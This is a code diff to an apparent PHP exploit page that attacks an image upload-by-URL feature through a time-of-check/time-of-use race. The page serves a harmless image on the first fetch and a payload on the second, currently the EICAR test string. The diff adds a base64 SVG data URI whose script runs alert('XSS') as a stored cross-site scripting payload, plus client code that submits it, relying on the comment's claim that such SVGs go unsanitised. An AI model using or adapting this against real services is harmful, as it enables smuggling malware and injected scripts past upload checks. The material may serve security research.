@@ -28,6 +28,8 @@ if ($mysqli->connect_error) {
 $png = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACXBIWXMAAC4jAAAuIwF4pT92AAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==";
 // 1x1 px JPG file
 $jpg = "/9j/4AAQSkZJRgABAQEBLAEsAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////2wBDAf//////////////////////////////////////////////////////////////////////////////////////wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAP/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AKAA/9k=";
+// Simple stored XSS via SVG
+$payload_svg = "data:image/svg;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgo8c3ZnIHZlcnNpb249IjEuMSIgYmFzZVByb2ZpbGU9ImZ1bGwiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CgkgIDxyZWN0IHg9IjEwMCIgeT0iMTAwIiB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgc3Ryb2tlPSJyZWQiIHN0cm9rZS13aWR0aD0iMTAiIGZpbGw9IndoaXRlIiAvPgoJICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CgkgIAlhbGVydCgnWFNTJyk7CgkgIDwvc2NyaXB0Pgo8L3N2Zz4=";
 // EICAR test virus
 $payload = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=";
 
@@ -96,14 +98,14 @@ if (isset($_REQUEST['get'])) {
     if (!is_known_file($requested_file)) {
         // respond to the first request with a benign file
         record_known_file($requested_file);
-        if (strpos($_REQUEST['get'], '.jpg')) {
+        if (strpos($_REQUEST['get'], '.jpeg')) {
             send_file('image/jpg', $_REQUEST['get'], base64_decode($jpg));
         } else if (strpos($_REQUEST['get'], '.png')) {
             send_file('image/png', $_REQUEST['get'], base64_decode($png));
         }
     } else {
         // respond to the second request with the malicious payload
-        if (strpos($_REQUEST['get'], '.jpg')) {
+        if (strpos($_REQUEST['get'], '.jpeg')) {
             send_file('image/jpg', $_REQUEST['get'], base64_decode($payload));
         } else if (strpos($_REQUEST['get'], '.png')) {
             send_file('image/png', $_REQUEST['get'], base64_decode($payload));
@@ -147,8 +149,18 @@ if (isset($_REQUEST['get'])) {
 
             // create the URL of the payload
             var ext = document.getElementById('extension').value;
-            var payloadURL = document.location.origin + document.location.pathname;
-            payloadURL += '?get=' + Math.round(Math.random() * (99999999)) + ext;
+            var payloadURL = '';
+            if (ext === '.svg') {
+                // SVGs can only be sent using a data: URI, so we can't upload a
+                // PE file with an SVG extension, for example. But SVGs uploaded
+                // using the URL parameter aren't sanitized, so if we're trying
+                // to send a stored XSS payload via SVG, we can just send the SVG
+                // directly and ignore the TOCTOU issue.
+                payloadURL = "<?php echo $payload_svg; ?>";
+            } else {
+                payloadURL = document.location.origin + document.location.pathname;
+                payloadURL += '?get=' + Math.round(Math.random() * (99999999)) + ext;
+            }
 
             // load the form and submit the exploit
             (document.getElementById('url')).setAttribute('value', payloadURL);
